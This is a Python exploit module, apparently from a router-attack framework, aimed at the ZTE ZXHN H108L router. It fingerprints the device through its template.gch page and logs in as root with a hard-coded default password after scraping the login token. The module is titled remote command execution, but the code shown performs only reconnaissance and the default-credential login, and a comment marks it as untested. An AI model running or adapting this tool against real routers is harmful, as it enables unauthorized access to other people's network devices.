#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import re

import requests

import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'ZTE ZXHN H108L Remote Command Execute',
        'description': 'ZTE ZXHN H108L Router allow remote command execute and has a default username and password',
        'reference': ['https://github.com/stasinopoulos/ZTExploit/'],
    }

    prompt = 'h108l_rce'

    def __init__(self):
        super().__init__()
        self.s = requests.Session()
        self.default_username = 'root'
        self.default_password = 'W!n0&oO7.'

    def run(self, host, port, timeout):
        # TODO NOT TESTING
        # utils.print_warning('!!!NO TESTING!!!')
        # if self.input_to_continue():
        self.info(host, port, timeout)

    def info(self, host, port, timeout):
        url = "http://{}:{}/template.gch".format(host, port)

        resp, err = self.http_get(self.s, url, timeout)
        if err:
            self.print_requests_err(host, port, err)
            return

        # Check for Model Name
        frm_modelname = self.regx_grab(resp.text, r'Frm_ModelName" class="tdright">(.*)<')
        if frm_modelname:
            utils.print_info("Model Name: {}".format(frm_modelname))
            utils.logger.send((host, port, frm_modelname))

        # Check for Serial Number
        frm_serialnumber =self.regx_grab(resp.text, r'Frm_SerialNumber" class="tdright">(.*)')
        if (frm_serialnumber):
            utils.print_info("Serial Number: {}".format(frm_serialnumber))

        # Check for Hardware Version
        frm_hardwarever = self.regx_grab(resp.text, r'Frm_HardwareVer" class="tdright">(.*)<')
        if frm_hardwarever:
            utils.print_info("Software Version: {}".format(frm_hardwarever))

        # Check for Boot Loader Version
        frm_bootver = self.regx_grab(resp.text, r'Frm_BootVer"  class="tdright">(.*)<')
        if frm_bootver:
            utils.print_info("Boot Loader Version: {}".format(frm_bootver))

    def check(self, host, port, timeout):
        if self.login(host, port, timeout):
            self.print_check_result(True, host)
            return True
        else:
            self.print_check_result(False, host)
            return False

    def login(self, host, port, timeout):
        url = 'http://{}:{}/'.format(host, port)
        resp, err = self.http_get(self.s, url, timeout)
        if err:
            self.print_requests_err(host, port, err)
            return False

        utils.print_info('"Retrieving random login token..."')
        token = self.regx_grab(resp.text, r'Frm_Logintoken"\)\.value = "(.*)";', 1)
        if token:
            utils.print_info(
                "Trying to log in with credentials {} : {}".format(self.default_username, self.default_password))
            url = 'http://{}:{}//login.gch'.format(host, port)
            data = {"Frm_Logintoken": token,
                    "Username": self.default_username,
                    "Password": self.default_password}
            resp, err = self.http_post(self.s, url, data=data, timeout=timeout)
            if err:
                self.print_requests_err(host, port, err)
                return False

            if "Username" not in resp.text and "Password" not in resp.text:
                utils.print_success("Successful authentication")
                return True
            else:
                return False
        else:
            utils.print_warning('Can not find the login token')
            return False

